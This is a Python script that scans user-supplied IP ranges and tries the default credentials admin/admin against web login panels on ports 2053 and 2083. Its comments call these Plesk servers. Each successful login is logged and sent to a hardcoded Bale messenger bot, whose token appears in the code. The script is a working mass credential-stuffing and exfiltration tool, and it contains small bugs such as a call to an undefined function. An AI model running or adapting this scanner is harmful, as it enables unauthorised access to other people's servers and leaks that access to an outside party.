import requests
import os
from time import localtime,time
from ping3 import ping
import platform


# Set the timeout for requests
# please set by network status
timeout = 0.5


time1 = time()

try:
    os.mkdir("data")
except:
    pass


with open("data/index.html", "a") as T:
    T.write('<style>*{text-align: center;color: aliceblue;background-color: black;}</style>\n<a href="iunknown.html">unknown</a>\n<a href="log.txt">log</a>\n<a href="ips.txt">ips</a> \n<a href="true.txt">true</a>\n<br/>')
    T.close()

def timer():
    return f"{localtime().tm_year}/{localtime().tm_mon}/{localtime().tm_mday} , {localtime().tm_hour}:{localtime().tm_min}"
    


def send_t(text):
    try:x=requests.post(f"https://tapi.bale.ai/bot912628592:RIidrxqrqTUdZWAJGkBhUy5ZOcSNrXQa1m4gLE4J/sendMessage",json={"chat_id": "369363336", "text": f"{text}"})
    except:pass

def loger(ip, port, text):
    """
    Log the result of checking the Plesk server at the given IP address and port.
    """
    with open("data/log.txt", "a+") as file:
        file.write(f"{ip}:{port} is {text} ({timer()})\n")
        file.close()

    if text == True:
        with open("data/index.html", "a+") as T:
            T.write(f"{ip}:{port} ({timer()})<br/>\n")
            T.close()
            send_t(f"http://{ip}:{port} ({timer()} CLI , {platform.system(), platform.release()})")

        with open("data/true.txt", "a+") as T2:
            T2.write(f"{ip}:{port}\n")
            T2.close()

    elif text == False:
        pass
    else:
        with open("data/iunknown.html", "a+") as T:
            T.write(f"{ip}:{port} is {text} ({timer()})<br/>\n")
            T.close()
            send(f"{ip}:{port} is {text} ({timer()} CLI on {platform.system(), platform.release()})")
loger("info", "", "loger started")


def ip_to_int(ip):
    parts = list(map(int, ip.split('.')))
    return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]

def int_to_ip(num):
    return f"{(num >> 24) & 255}.{(num >> 16) & 255}.{(num >> 8) & 255}.{num & 255}"

def ip_range(ip1, ip2):
    try:
        start = ip_to_int(ip1)
        end = ip_to_int(ip2)
        
        if start > end:
            start, end = end, start
        
        for num in range(start, end + 1):
            ip = int_to_ip(num)
            with open("data/ips.txt", "a+") as my_file:
              my_file.write(f"{ip}\n")
    except ValueError:
        print("ip invalid")



if input("#Toomaj\ncreate newip range?(y/n)==> ").upper() == "Y":
    my_file = open("data/ips.txt", "w")
    my_file.write("")
    my_file.close()
    while True:
        ip_range(input("first ip (X.X.X.X) ==>"),(input("Last ip (X.X.X.X)==>")))
        if input("do you want to add more ip range? Y/n ==> ").upper() == "Y":pass
        else:print("start searching...");break
else:print("start searching...")


def checker(ip: str, timeout: int, port : int):
    """
    Check if the Plesk server at the given IP address and port 2083 is accessible.
    """
    try:
        url = f"http://{ip}:{port}/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False



# Read the IP addresses from the file
with open("data/ips.txt", "r") as file:
    ips = file.readlines()

# Iterate over the IP addresses and check if the Plesk servers are accessible
index = 0
while index < len(ips):
    ip = ips[index].strip()  # حذف فاصله‌های اضافی
    if ping(ip, timeout) is not None:
        result53 = checker(ip, timeout, 2053)
        result83 = checker(ip, timeout, 2083)

        if result53 == False:
            loger(ip, 2053, False)
        elif result53 == True:
            loger(ip, 2053, True)
        else:
            loger(ip, 2053, result53)

        if result83 == False:
            loger(ip, 2083, False)
        elif result83 == True:
            loger(ip, 2083, True)
        else:
            loger(ip, 2083, result83)

        # Remove the processed IP from the list
        ips.pop(index)

        # Update the file to reflect the remaining IPs
        with open("data/ips.txt", "w") as file:
            file.writelines(f"{ip}\n" for ip in ips)
    else:
        # اگر آی‌پی قابل پینگ نبود به آیتم بعدی بروید
        index += 1

time2 = time()

loger("info", "", "Done!")
input(f"press enter to close\n result in data folder \n The time it took to complete:{round(time2-time1)} second")